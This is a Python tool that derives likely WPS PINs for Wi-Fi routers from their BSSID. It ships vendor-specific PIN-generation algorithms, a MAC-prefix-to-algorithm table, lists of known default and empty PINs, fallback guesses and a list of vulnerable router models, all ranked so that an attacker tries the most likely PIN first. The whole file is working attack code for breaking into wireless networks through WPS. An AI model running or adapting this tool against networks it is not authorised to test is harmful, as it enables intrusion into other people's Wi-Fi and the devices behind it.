#!/usr/bin/env python3
"""
WPS PIN Engine v2 - Smart PIN Prioritization
Analyzes BSSID to determine chipset → suggests best PINs first
"""

import re

def checksum(pin_int):
    accum = 0
    p = pin_int
    while p:
        accum += (3 * (p % 10))
        p = int(p / 10)
        accum += (p % 10)
        p = int(p / 10)
    return (10 - accum % 10) % 10

def mac2int(bssid):
    return int(bssid.replace(":", "").replace("-", ""), 16)

def pin24(bssid):
    p = mac2int(bssid) & 0xFFFFFF
    s = str(p % 10000000).zfill(7)
    return s + str(checksum(int(s)))

def pin28(bssid):
    p = mac2int(bssid) & 0xFFFFFFF
    s = str(p % 10000000).zfill(7)
    return s + str(checksum(int(s)))

def pin32(bssid):
    p = mac2int(bssid) % 0x100000000
    s = str(p % 10000000).zfill(7)
    return s + str(checksum(int(s)))

def pin_dlink(bssid):
    mb = bytes.fromhex(bssid.replace(":", ""))
    nic = int.from_bytes(mb[3:6], "big")
    p = nic ^ 0x55AA55
    p ^= (((p & 0xF) << 4) + ((p & 0xF) << 8) +
          ((p & 0xF) << 12) + ((p & 0xF) << 16) +
          ((p & 0xF) << 20))
    p %= 10000000
    if p < 1000000:
        p += ((nic & 0x7) * 1000000)
    s = str(p).zfill(7)
    return s + str(checksum(int(s)))

def pin_dlink1(bssid):
    mb = bytes.fromhex(bssid.replace(":", ""))
    nic = (int.from_bytes(mb[3:6], "big") + 1) & 0xFFFFFF
    p = nic ^ 0x55AA55
    p ^= (((p & 0xF) << 4) + ((p & 0xF) << 8) +
          ((p & 0xF) << 12) + ((p & 0xF) << 16) +
          ((p & 0xF) << 20))
    p %= 10000000
    if p < 1000000:
        p += ((nic & 0x7) * 1000000)
    s = str(p).zfill(7)
    return s + str(checksum(int(s)))

def pin_asus(bssid):
    mb = bytes.fromhex(bssid.replace(":", ""))
    b = [int(x) for x in mb]
    p = 0
    for i in range(7):
        p += (b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)
        p *= 10
    p = p // 10
    s = str(p % 10000000).zfill(7)
    return s + str(checksum(int(s)))

def pin_airocon(bssid):
    mb = bytes.fromhex(bssid.replace(":", ""))
    b = [int(x) for x in mb]
    p = ((b[0]+b[1])%10)*1000000 + ((b[2]+b[3])%10)*100000 +         ((b[4]+b[5])%10)*10000 + ((b[0]+b[1]+b[2])%10)*1000 +         ((b[3]+b[4]+b[5])%10)*100 + ((b[0]+b[2]+b[4])%10)*10 +         ((b[1]+b[3]+b[5])%10)
    s = str(p).zfill(7)
    return s + str(checksum(int(s)))


ALGOS = {
    "pin24": pin24, "pin28": pin28, "pin32": pin32,
    "pin_dlink": pin_dlink, "pin_dlink1": pin_dlink1,
    "pin_asus": pin_asus, "pin_airocon": pin_airocon,
}


# ═══════════════════════════════════════════════════════
# CHIPSET DETECTION FROM MAC
# Priority: higher number = more specific match = try first
# ═══════════════════════════════════════════════════════

MANUFACTURER_DB = {
    # ── TP-Link ──
    "50C7BF": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "C0E42D": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "54C80F": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "60E327": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "5C3A45": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "D46E0E": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "EC086B": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "14CF92": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "20DCE6": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "30B5C2": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "44D1FA": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "6C5AB0": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "78A106": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "90F652": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "A42BB0": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "B04E26": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "C025E9": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "CC32E5": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "D807B6": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "E8DE27": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "F4EC38": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "1CB044": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "283CE4": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "3497F6": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "645601": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "94D9B3": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "AC84C6": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "BC10BD": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "DCFE18": {"name": "TP-Link", "algo": "pin28", "confidence": 90},
    "F81A67": {"name": "TP-Link", "algo": "pin24", "confidence": 90},

    # ── D-Link ──
    "14D64D": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "1C7EE5": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "28107B": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "84C9B2": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "CCB255": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "C8D3A3": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "C8BE19": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "B8A386": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "C0A0BB": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "A0AB1B": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "00055D": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "000D88": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "001346": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "0015E9": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "00179A": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "00195B": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "001B11": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "001CF0": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "001E58": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "002191": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "0022B0": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "002401": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},
    "00265A": {"name": "D-Link", "algo": "pin_dlink", "confidence": 95},

    # ── ASUS ──
    "10C37B": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "1C872C": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "382C4A": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "08606E": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "04D9F5": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "2C56DC": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "2CFDA1": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "50465D": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "54A050": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "6045CB": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "60A44C": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "704D7B": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "74D02B": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "7824AF": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "88D7F6": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "9C5C8E": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "AC220B": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "AC9E17": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "B06EBF": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "BCEE7B": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "D017C2": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "D850E6": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "E03F49": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "F832E4": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "00177C": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},
    "081077": {"name": "ASUS", "algo": "pin_asus", "confidence": 95},

    # ── Netgear ──
    "2C3033": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "0026F2": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "20E52A": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "841B5E": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "A021B7": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "C03F0E": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "4C60DE": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "6C3B6B": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "E4F4C6": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "B07FB0": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "907240": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "C43DC7": {"name": "Netgear", "algo": "pin32", "confidence": 85},
    "F87394": {"name": "Netgear", "algo": "pin32", "confidence": 85},

    # ── Linksys ──
    "001839": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "001A70": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "001C10": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "002129": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "00226B": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "002369": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "00259C": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "C0C1C0": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "687F74": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "586D8F": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "20AA4B": {"name": "Linksys", "algo": "pin24", "confidence": 85},
    "28B2BD": {"name": "Linksys", "algo": "pin24", "confidence": 85},

    # ── Huawei ──
    "002568": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "487B6B": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "00664B": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "346BD3": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "F4C714": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "388345": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "D07AB5": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "E8CD2D": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "F80113": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "786A89": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "88E3AB": {"name": "Huawei", "algo": "pin28", "confidence": 80},
    "48AD08": {"name": "Huawei", "algo": "pin28", "confidence": 80},

    # ── Xiaomi ──
    "7811DC": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "640980": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "8CBEBB": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "34CE00": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "50642B": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "68DFDD": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "7451BA": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "7CB59B": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "F48B32": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "F4F5D8": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "FC643A": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "FCDBB3": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "D4970B": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "D4F057": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "D8CB8A": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "DCD321": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "286C07": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},
    "2C3B70": {"name": "Xiaomi", "algo": "pin28", "confidence": 80},

    # ── Tenda ──
    "C83A35": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "00B00C": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "04CE14": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "089E08": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "147DC5": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "181B2C": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "503EAA": {"name": "Tenda", "algo": "pin28", "confidence": 80},
    "C42F90": {"name": "Tenda", "algo": "pin28", "confidence": 80},

    # ── ZTE ──
    "A43BFA": {"name": "ZTE", "algo": "pin28", "confidence": 75},
    "F88E85": {"name": "ZTE", "algo": "pin28", "confidence": 75},
    "587F66": {"name": "ZTE", "algo": "pin28", "confidence": 75},
    "344B50": {"name": "ZTE", "algo": "pin28", "confidence": 75},
    "5C353B": {"name": "ZTE", "algo": "pin28", "confidence": 75},
    "DC537C": {"name": "ZTE", "algo": "pin28", "confidence": 75},

    # ── Broadcom (generic) ──
    "00904C": {"name": "Broadcom", "algo": "pin24", "confidence": 70},
    "001018": {"name": "Broadcom", "algo": "pin24", "confidence": 70},

    # ── Realtek ──
    "00E04C": {"name": "Realtek", "algo": "pin32", "confidence": 70},

    # ── Airocon ──
    "002586": {"name": "Airocon", "algo": "pin_airocon", "confidence": 90},
    "001D6A": {"name": "Airocon", "algo": "pin_airocon", "confidence": 90},
}


# ═══════════════════════════════════════════════════════
# STATIC PIN OVERRIDES (known default PINs for specific OUIs)
# These are tried BEFORE algorithm-generated PINs
# ═══════════════════════════════════════════════════════

STATIC_PIN_OVERRIDES = {
    # Broadcom chipsets
    "ACF1DF": "20172527", "BCF685": "20172527", "C8D3A3": "20172527",
    "988B5D": "20172527", "001AA9": "20172527", "14144B": "20172527",
    "EC6264": "20172527",
    "20AA4B": "20172527", "C8D719": "20172527",

    # Broadcom 2
    "4C17EB": "46264848", "18622C": "46264848", "7C03D8": "46264848",
    "D86CE9": "46264848", "204E7F": "46264848",

    # Cisco
    "001A2B": "12345678", "00248C": "12345678", "002618": "12345678",
    "344DEB": "12345678", "7071BC": "12345678", "E06995": "12345678",
    "E0CB4E": "12345678", "7054F5": "12345678",

    # Airocon
    "181E78": "30432031", "40F201": "30432031", "44E9DD": "30432031",
    "D084B0": "30432031",
    "84A423": "71412252", "8C10D4": "71412252", "88A6C6": "71412252",

    # DSL-2740R
    "00265A": "68175540", "1CBDB9": "68175540", "340804": "68175540",
    "5CD998": "68175540", "84C9B2": "68175540", "FC7516": "68175540",

    # Realtek
    "0014D1": "95661469", "000C42": "95661469", "000EE8": "95661469",
    "007263": "95719115", "E4BEED": "95719115",
    "08C6B3": "48563710",

    # Upvel
    "784476": "20854830", "D4BF7F": "20854830", "F8C091": "20854830",
    "D4BF7F60": "43977680",
    "D4BF7F5": "05294170",

    # Edimax
    "801F02": "35611664", "00E04C": "35611664",

    # Thomson
    "002624": "67958146", "4432C8": "67958146", "88F7C7": "67958146",
    "CC03FA": "67958146",

    # HG532x
    "086361": "34259283", "087A4C": "34259283", "0C96BF": "34259283",
    "14B968": "34259283", "2008ED": "34259283", "2469A5": "34259283",
    "9CC172": "34259283", "ACE215": "34259283", "CCA223": "34259283",
    "F83DFF": "34259283",

    # H108L
    "4C09B4": "94229882", "4CAC0A": "94229882", "84742A": "94229882",
    "9CD24B": "94229882", "B075D5": "94229882", "C864C7": "94229882",
    "DC028E": "94229882", "FCC897": "94229882",

    # CBN ONO
    "5C353B": "95755210", "DC537C": "95755210",
}


# ═══════════════════════════════════════════════════════
# EMPTY PIN OUIs (these devices respond to empty/null PIN)
# ═══════════════════════════════════════════════════════

EMPTY_PIN_OUIS = [
    "E46F13", "EC2280", "58D56E", "1062EB", "10BEF5",
    "1C5F2B", "802689", "A0AB1B", "74DADA", "9CD643",
    "68A0F6", "0C96BF", "20F3A3", "ACE215", "C8D15E",
    "000E8F", "D42122", "3C9872", "788102", "7894B4",
    "D460E3", "E06066", "004A77", "2C957F", "64136C",
    "74A78E", "88D274", "702E22", "74B57E", "789682",
    "7C3953", "8C68C8", "D476EA", "344DEA", "38D82F",
    "54BE53", "709F2D", "94A7B7", "981333", "CAA366",
    "D0608C",
]


# ═══════════════════════════════════════════════════════
# COMMON FALLBACK PINs (last resort)
# ═══════════════════════════════════════════════════════

FALLBACK_PINS = [
    "12345670", "00000000", "12345678", "11111111", "22222222",
    "33333333", "44444444", "55555555", "66666666", "77777777",
    "88888888", "99999999", "87654321", "11223344", "13572468",
    "24681357", "98765432", "01234567", "12341234", "10203040",
]


# ═══════════════════════════════════════════════════════
# VULNERABLE MODELS
# ═══════════════════════════════════════════════════════

VULN_MODELS = [
    "TL-WR", "TL-WA", "Archer", "TD-W", "DIR-", "DAP-", "DWR-", "DSL-",
    "RT-N", "RT-AC", "RT-AX", "WNR", "WNDR", "R6", "R7", "R8", "RAX",
    "E1", "E2", "E3", "E4", "EA", "HG532", "HG655", "HG8", "H108L",
    "Mi Router", "Redmi", "MF", "ZXHN", "Keenetic", "WAP", "WRT",
    "Deco", "Orbi", "Velop", "Nova", "TUF", "ROG", "ZenWiFi",
    "FRITZ!Box", "FRITZ!Repeater", "eero", "Nest Wifi", "SmartThings",
    "GL.iNet", "Cudy", "Mercusys", "Reyee", "Ruijie",
    "ZTE", "Livebox", "Speedport",
]


# ═══════════════════════════════════════════════════════
# SMART PIN SUGGESTER
# ═══════════════════════════════════════════════════════

def detect_manufacturer(bssid):
    """Detect manufacturer and best algorithm from BSSID"""
    mac = bssid.replace(":", "").replace("-", "").upper()

    # Try 6-char prefix first (most common)
    prefix6 = mac[:6]
    if prefix6 in MANUFACTURER_DB:
        info = MANUFACTURER_DB[prefix6]
        return info["name"], info["algo"], info["confidence"]

    # Try 8-char prefix (more specific)
    prefix8 = mac[:8]
    for pfx, info in MANUFACTURER_DB.items():
        if prefix8.startswith(pfx):
            return info["name"], info["algo"], info["confidence"]

    return None, None, 0


def suggest_pins(bssid, wps_version="", wps_locked="Unknown"):
    """
    Smart PIN suggestion engine.
    Priority order:
    1. Static override PIN (known default for this exact OUI)
    2. Algorithm-generated PIN (chipset-specific)
    3. Manufacturer default PINs
    4. Common fallback PINs
    """
    suggestions = []
    seen = set()
    mac = bssid.replace(":", "").replace("-", "").upper()

    # ── Priority 1: Static override (exact OUI match) ──
    for prefix_len in [8, 6]:
        prefix = mac[:prefix_len]
        if prefix in STATIC_PIN_OVERRIDES:
            pin = STATIC_PIN_OVERRIDES[prefix]
            if pin not in seen:
                suggestions.append({
                    "pin": pin,
                    "method": f"static_override ({prefix})",
                    "priority": 1,
                    "confidence": 95,
                })
                seen.add(pin)

    # ── Priority 2: Empty PIN (some devices accept it) ──
    for oui in EMPTY_PIN_OUIS:
        if mac.startswith(oui):
            if "00000000" not in seen:
                suggestions.append({
                    "pin": "00000000",
                    "method": "empty_pin",
                    "priority": 1,
                    "confidence": 60,
                })
                seen.add("00000000")
            break

    # ── Priority 3: Algorithm-generated PIN ──
    manufacturer, algo, confidence = detect_manufacturer(bssid)

    if algo and algo in ALGOS:
        try:
            pin = ALGOS[algo](bssid)
            if pin and pin not in seen:
                suggestions.append({
                    "pin": pin,
                    "method": f"{algo} ({manufacturer or 'unknown'})",
                    "priority": 2,
                    "confidence": confidence,
                })
                seen.add(pin)
        except Exception:
            pass

    # Try D-Link variant if original D-Link detected
    if algo == "pin_dlink":
        try:
            pin2 = pin_dlink1(bssid)
            if pin2 and pin2 not in seen:
                suggestions.append({
                    "pin": pin2,
                    "method": "pin_dlink1 (variant)",
                    "priority": 2,
                    "confidence": 85,
                })
                seen.add(pin2)
        except Exception:
            pass

    # ── Priority 4: Generic algorithms (if no specific match) ──
    if not any(s["priority"] <= 2 for s in suggestions):
        for name, func in [("pin28", pin28), ("pin24", pin24), ("pin32", pin32)]:
            try:
                pin = func(bssid)
                if pin and pin not in seen:
                    suggestions.append({
                        "pin": pin,
                        "method": f"generic_{name}",
                        "priority": 3,
                        "confidence": 40,
                    })
                    seen.add(pin)
            except Exception:
                pass

    # ── Priority 5: Manufacturer-specific default PINs ──
    mfr_defaults = {
        "TP-Link": ["12345670"],
        "D-Link": ["12345670"],
        "ASUS": ["12345670"],
        "Netgear": ["12345670"],
        "Linksys": ["12345670"],
        "Huawei": ["00000000"],
        "Xiaomi": ["00000000"],
        "Tenda": ["12345670"],
        "ZTE": ["12345670"],
    }
    if manufacturer and manufacturer in mfr_defaults:
        for pin in mfr_defaults[manufacturer]:
            if pin not in seen:
                suggestions.append({
                    "pin": pin,
                    "method": f"{manufacturer}_default",
                    "priority": 4,
                    "confidence": 30,
                })
                seen.add(pin)

    # ── Priority 6: Common fallback PINs ──
    for pin in FALLBACK_PINS:
        if pin not in seen:
            suggestions.append({
                "pin": pin,
                "method": "common_fallback",
                "priority": 5,
                "confidence": 10,
            })
            seen.add(pin)

    # Sort by priority (lower = better) then confidence (higher = better)
    suggestions.sort(key=lambda x: (x["priority"], -x["confidence"]))

    return suggestions


def get_best_pin(bssid, wps_version="", wps_locked="Unknown"):
    """Get the single best PIN to try first"""
    suggestions = suggest_pins(bssid, wps_version, wps_locked)
    if suggestions:
        return suggestions[0]["pin"]
    return "12345670"


def is_vulnerable_model(model, device_name):
    """Check if model is in vulnerable list"""
    search = f"{model} {device_name}".upper()
    for pattern in VULN_MODELS:
        if pattern.upper() in search:
            return True, pattern
    return False, None
